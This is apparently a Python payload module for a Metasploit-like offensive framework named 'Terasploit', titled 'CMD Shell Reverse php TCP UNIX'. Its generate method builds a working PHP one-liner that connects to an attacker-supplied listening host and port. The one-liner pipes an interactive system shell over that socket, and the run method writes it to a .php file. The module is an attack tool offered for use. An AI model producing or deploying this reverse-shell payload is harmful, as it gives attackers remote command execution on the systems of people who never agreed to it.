#######
# Module/Payload: Reverse TCP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitPayload(Payload):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {
                'License'        : 'Terasploit Framework License (BSD)',
                'Name'           : 'CMD Shell Reverse php TCP UNIX',
                'PayloadHandler' : PayloadHandler.REVERSE_TCP,
                'Module'         : Module.payload,
                'Arch'           : Arch.CMD,
                'Platform'       : Platform.UNIX,
                'Author'         : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description'    : [
                    'Generates an interactive reverse shell via php'
                ],
                
            }
        )
        
        if info_only:
            return

        register_option ("payload",opt=[
            OptString.create("shell",['sh','yes','the shell system']),
            OptIP.create("lhost",["","yes","the listening address"]),
            OptPort.create("lport",[4444,"yes","the listening port (tcp)"])
        ])


    def run(self) -> None: 
        print_info (f'Generating shell...')
        self.generate_file("shell",Extension.PHP,self.generate())
        print ('----' + '\n' + f'{self.generate()}' + '\n' + '----')
        return
    
    
    def generate(self):
        shell_system, lhost, lport = self.OPT()
        raw_shell: str = (
            f"$sock=fsockopen('{lhost}',{lport});$proc=proc_open('{shell_system}',array(0=>$sock,1=>$sock,2=>$sock),$pipes);"
        )
        
        return (
            'php -r "{}"'.format(
                raw_shell
            )
        )